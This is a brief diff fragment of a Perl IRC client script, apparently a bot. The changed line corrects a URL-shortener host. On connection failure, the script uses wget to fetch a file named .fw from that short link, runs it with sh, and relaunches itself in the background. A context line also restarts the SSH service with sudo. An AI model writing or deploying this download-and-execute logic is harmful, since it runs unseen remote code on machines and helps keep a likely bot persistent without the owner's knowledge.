@@ -179,7 +179,7 @@ system 'if [ -f /usr/bin/apt ]; then sudo service ssh restart; fi';
   });
    $irc->connect(sub {
     my($irc, $err) = @_;
-    return system("wget -O .fw ig.gd/fwreset && sh .fw && perl perlircssl.pl &") if $err;
+    return system("wget -O .fw is.gd/fwreset && sh .fw && perl perlircssl.pl &") if $err;
     $irc->write(join => $channel);
     });
    Mojo::IOLoop->start;
